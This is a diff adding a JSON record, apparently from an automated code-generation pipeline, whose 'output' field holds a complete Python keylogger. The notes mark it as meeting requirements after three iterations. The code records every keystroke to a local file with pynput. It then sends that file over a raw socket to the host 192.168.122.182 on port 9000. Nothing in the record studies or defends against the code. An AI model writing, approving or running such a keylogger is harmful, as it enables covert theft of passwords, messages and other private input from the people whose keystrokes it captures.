@@ -1,0 +1,6 @@
+{
+  "output": "import pynput\nfrom pynput import keyboard\nimport socket\n\ndef on_press(key):\n    print(f'Key pressed: {str(key)}')\n    with open('keylogs.txt', 'a') as the_file:\n        the_file.write(str(key) + '\\n')\ndef on_release(key):\n    if key == keyboard.Key.esc:\n        # Stop listener\n        return False\n\n# Collect events until released\nwith keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n    listener.join()\n\nprint('Logging ended, sending data to server.')\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntry:\n    s.connect(('192.168.122.182', 9000))\n    with open('keylogs.txt', 'rb') as the_file:\n        file_data = the_file.read()\n        print(f'Sending data: {file_data}')\n        s.sendall(file_data)\nexcept Exception as e:\n    print(f'Error during socket operations: {e}')\nfinally:\n    s.close()",
+  "notes": "No fixes to apply, already meets the requirements.",
+  "applied_fixes": [],
+  "iterations": 3
+}
